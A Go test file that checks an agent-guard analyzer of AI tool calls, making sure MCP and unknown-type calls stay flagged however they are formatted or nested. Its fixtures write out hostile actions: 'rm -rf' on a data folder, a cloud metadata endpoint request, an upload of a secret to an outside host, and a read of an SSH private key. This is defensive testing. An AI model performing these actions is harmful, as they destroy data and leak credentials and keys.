package agentguard

import (
	"context"
	"strings"
	"testing"

	"github.com/yangjiyj/aiguard/packages/shared-go/protection"
)

func TestMCPArgumentFamiliesNormalizeToolType(t *testing.T) {
	for _, toolType := range []string{ToolTypeMCP, ToolTypeUnknown} {
		input := ToolCallAnalysisInput{
			ToolName: "acme_dispatch", ToolType: toolType,
			Arguments: map[string]any{"command": "rm -rf /workspace/data"}, Mode: ModeStrict,
		}
		want := AnalyzeToolCall(context.Background(), input)
		if want.RawDecision == DecisionAllow {
			t.Fatalf("command fixture must exercise analysis: %+v", want)
		}
		input.ToolType = " " + strings.ToUpper(toolType) + " "
		got := AnalyzeToolCall(context.Background(), input)
		if got.RawDecision != want.RawDecision || got.EffectiveDecision != want.EffectiveDecision || got.Reason != want.Reason {
			t.Fatalf("tool type formatting hid command-family analysis: type=%q got=%+v want=%+v", input.ToolType, got, want)
		}
	}
}

// requireMCPProtectionHit：敏感目标防护项配成阻断时照拦（配置结论），默认配置下同一输入
// 告警放行。
func requireMCPProtectionHit(t *testing.T, input ToolCallAnalysisInput, label string) {
	t.Helper()
	input.Mode = ModeStrict
	if blocked, _ := requireConfiguredBlockDefaultAlert(t, label, input, blockingProtections(protection.GroupAgentTarget)); !blocked.ConfiguredEnforcement {
		t.Fatalf("%s: configured block must carry ConfiguredEnforcement: %+v", label, blocked)
	}
}

func TestMCPArgumentFamiliesCannotHideIndependentProtection(t *testing.T) {
	for _, toolType := range []string{ToolTypeMCP, ToolTypeUnknown} {
		for _, args := range []map[string]any{
			{"url": "http://169.254.169.254/latest/meta-data"},
			{"url": "https://outside.example/upload", "body": "canary-test-secret-fixture"},
			{"command": "echo hello", "url": "https://outside.example/upload", "body": "canary-test-secret-fixture"},
			{"command": "echo hello", "path": "/home/app/.ssh/id_rsa"},
		} {
			requireMCPProtectionHit(t, ToolCallAnalysisInput{ToolName: "acme_dispatch", ToolType: toolType, Arguments: args},
				"generic tool "+toolType)
		}
	}
}

func TestMCPNamedAndNestedArgumentsRetainProtectionHits(t *testing.T) {
	for _, input := range []ToolCallAnalysisInput{
		{ToolName: "Read", ToolType: ToolTypeFile, Arguments: map[string]any{"url": "http://169.254.169.254/latest/meta-data"}},
		{ToolName: "Bash", ToolType: ToolTypeSystem, Arguments: map[string]any{"command": "echo hello", "url": "https://outside.example/upload", "body": "canary-test-secret-fixture"}},
		{ToolName: "Read", ToolType: ToolTypeFile, Arguments: map[string]any{"request": map[string]any{"url": "https://outside.example/upload", "body": "canary-test-secret-fixture"}}},
	} {
		requireMCPProtectionHit(t, input, "named or nested "+input.ToolName)
	}
}
